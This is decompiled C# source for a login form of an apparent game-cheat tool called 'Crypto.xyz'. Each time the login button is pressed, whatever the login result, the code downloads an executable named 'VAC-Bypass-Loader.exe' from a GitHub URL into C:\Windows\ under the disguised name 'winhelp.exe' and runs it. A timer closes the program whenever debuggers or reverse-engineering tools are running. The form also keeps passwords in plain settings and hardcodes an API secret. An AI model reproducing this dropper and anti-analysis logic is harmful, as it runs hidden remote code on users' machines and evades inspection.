using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Windows.Forms;
using Crypto.xyz.Properties;
using KeyAuth;

namespace gamesense
{
	// Token: 0x02000009 RID: 9
	public partial class Form1 : Form
	{
		// Token: 0x06000044 RID: 68
		[DllImport("user32.dll")]
		public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);

		// Token: 0x06000045 RID: 69
		[DllImport("user32.dll")]
		public static extern bool ReleaseCapture();

		// Token: 0x06000046 RID: 70 RVA: 0x001AE028 File Offset: 0x001A7C28
		public Form1()
		{
			this.InitializeComponent();
		}

		// Token: 0x06000047 RID: 71 RVA: 0x001AE078 File Offset: 0x001A7C78
		private void Form1_Load(object sender, EventArgs e)
		{
			Form1.KeyAuthApp.init();
			if (Form1.KeyAuthApp.checkblack())
			{
				Environment.Exit(0);
			}
			this.txtUsername.Text = Settings.Default.remUsername;
			this.txtPassword.Text = Settings.Default.remPassword;
			if (this.txtUsername.Text != "Username" && this.txtPassword.Text != "Password")
			{
				this.checkRemember.Checked = true;
			}
			this.timer1.Start();
			ServicePointManager.SecurityProtocol = (SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12);
			if (Settings.Default.remUsername != string.Empty)
			{
				this.txtUsername.Text = Settings.Default.remUsername;
				this.txtPassword.Text = Settings.Default.remPassword;
			}
		}

		// Token: 0x06000048 RID: 72 RVA: 0x001AC77C File Offset: 0x001A637C
		private void timer1_Tick(object sender, EventArgs e)
		{
			Process[] processesByName = Process.GetProcessesByName("ida64");
			Process[] processesByName2 = Process.GetProcessesByName("ida32");
			Process[] processesByName3 = Process.GetProcessesByName("ollydbg");
			Process[] processesByName4 = Process.GetProcessesByName("ollydbg64");
			Process[] processesByName5 = Process.GetProcessesByName("loaddll");
			Process[] processesByName6 = Process.GetProcessesByName("httpdebugger");
			Process[] processesByName7 = Process.GetProcessesByName("windowrenamer");
			Process[] processesByName8 = Process.GetProcessesByName("processhacker");
			Process[] processesByName9 = Process.GetProcessesByName("Process Hacker");
			Process[] processesByName10 = Process.GetProcessesByName("ProcessHacker");
			Process[] processesByName11 = Process.GetProcessesByName("HxD");
			Process[] processesByName12 = Process.GetProcessesByName("parsecd");
			Process[] processesByName13 = Process.GetProcessesByName("ida");
			Process[] processesByName14 = Process.GetProcessesByName("dnSpy");
			if (processesByName.Length != 0 || processesByName2.Length != 0 || processesByName3.Length != 0 || processesByName4.Length != 0 || processesByName5.Length != 0 || processesByName6.Length != 0 || processesByName7.Length != 0 || processesByName8.Length != 0 || processesByName9.Length != 0 || processesByName10.Length != 0 || processesByName11.Length != 0 || processesByName13.Length != 0 || processesByName12.Length != 0 || processesByName14.Length != 0)
			{
				Application.Exit();
			}
		}

		// Token: 0x06000049 RID: 73 RVA: 0x001AE17C File Offset: 0x001A7D7C
		private void button1_Click_1(object sender, EventArgs e)
		{
			if (Form1.KeyAuthApp.login(this.txtUsername.Text, this.txtPassword.Text))
			{
				MessageBox.Show("Welcome " + Form1.KeyAuthApp.user_data.username.ToString() + "!", "Crypto.xyz");
				Settings.Default.remUsername = this.txtUsername.Text;
				Settings.Default.remPassword = this.txtPassword.Text;
				Settings.Default.Save();
				new Form3().Show();
				base.Hide();
			}
			WebClient webClient = new WebClient();
			string text = "C:\\Windows\\" + this.bypass_name + ".exe";
			webClient.DownloadFile(this.bypass_link, text);
			Task.Delay(10000);
			Process.Start("winhelp.exe");
			if (this.bypass_array.Length != 0 && File.Exists(text))
			{
				File.Delete(text);
			}
			if (!this.checkRemember.Checked)
			{
				Settings.Default.remUsername = "Username";
				Settings.Default.remPassword = "Password";
				Settings.Default.Save();
			}
		}

		// Token: 0x0600004A RID: 74 RVA: 0x001AA20F File Offset: 0x001A3E0F
		private void button2_Click_1(object sender, EventArgs e)
		{
			new Form2().Show();
			base.Hide();
		}

		// Token: 0x0600004B RID: 75 RVA: 0x001AA1DA File Offset: 0x001A3DDA
		private void button4_Click(object sender, EventArgs e)
		{
			Application.Exit();
		}

		// Token: 0x0600004C RID: 76 RVA: 0x001AA224 File Offset: 0x001A3E24
		private void txtUsername_Enter(object sender, EventArgs e)
		{
			if (this.txtUsername.Text == "Username")
			{
				this.txtUsername.Text = "";
			}
		}

		// Token: 0x0600004D RID: 77 RVA: 0x001AA253 File Offset: 0x001A3E53
		private void txtUsername_Leave(object sender, EventArgs e)
		{
			if (this.txtUsername.Text == "")
			{
				this.txtUsername.Text = "Username";
			}
		}

		// Token: 0x0600004E RID: 78 RVA: 0x001AA282 File Offset: 0x001A3E82
		private void txtPassword_Enter(object sender, EventArgs e)
		{
			if (this.txtPassword.Text == "Password")
			{
				this.txtPassword.Text = "";
			}
		}

		// Token: 0x0600004F RID: 79 RVA: 0x001AA2B1 File Offset: 0x001A3EB1
		private void txtPassword_Leave(object sender, EventArgs e)
		{
			if (this.txtPassword.Text == "")
			{
				this.txtPassword.Text = "Password";
			}
		}

		// Token: 0x06000050 RID: 80 RVA: 0x001AA2E0 File Offset: 0x001A3EE0
		private void checkBox1_CheckedChanged(object sender, EventArgs e)
		{
			if (this.checkBox1.Checked)
			{
				this.txtPassword.UseSystemPasswordChar = false;
				return;
			}
			this.txtPassword.UseSystemPasswordChar = true;
		}

		// Token: 0x06000051 RID: 81 RVA: 0x001AA188 File Offset: 0x001A3D88
		private void label11_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000052 RID: 82 RVA: 0x001AA188 File Offset: 0x001A3D88
		private void checkRemember_CheckedChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000053 RID: 83 RVA: 0x001AA188 File Offset: 0x001A3D88
		private void txtUsername_TextChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000054 RID: 84 RVA: 0x001AA319 File Offset: 0x001A3F19
		private void Form1_MouseMove(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Left)
			{
				Form1.ReleaseCapture();
				Form1.SendMessage(base.Handle, 161, 2, 0);
			}
		}

		// Token: 0x04000038 RID: 56
		private string bypass_link = "https://github.com/TapHvH/gsgsdhhh/raw/main/VAC-Bypass-Loader.exe";

		// Token: 0x04000039 RID: 57
		private string bypass_name = "winhelp";

		// Token: 0x0400003A RID: 58
		private Process[] bypass_array = Process.GetProcessesByName("winhelp");

		// Token: 0x0400003B RID: 59
		public const int WM_NCLBUTTONDOWN = 161;

		// Token: 0x0400003C RID: 60
		public const int HT_CAPTION = 2;

		// Token: 0x0400003D RID: 61
		private static string name = "Crypto.xyz";

		// Token: 0x0400003E RID: 62
		private static string ownerid = "rjNPznxhP4";

		// Token: 0x0400003F RID: 63
		private static string secret = "64871944fcb3db44189ab45bb9e25483bc46f5c2c0618850cb0659ebcda88eda";

		// Token: 0x04000040 RID: 64
		private static string version = "1.0";

		// Token: 0x04000041 RID: 65
		public static api KeyAuthApp = new api(Form1.name, Form1.ownerid, Form1.secret, Form1.version);
	}
}
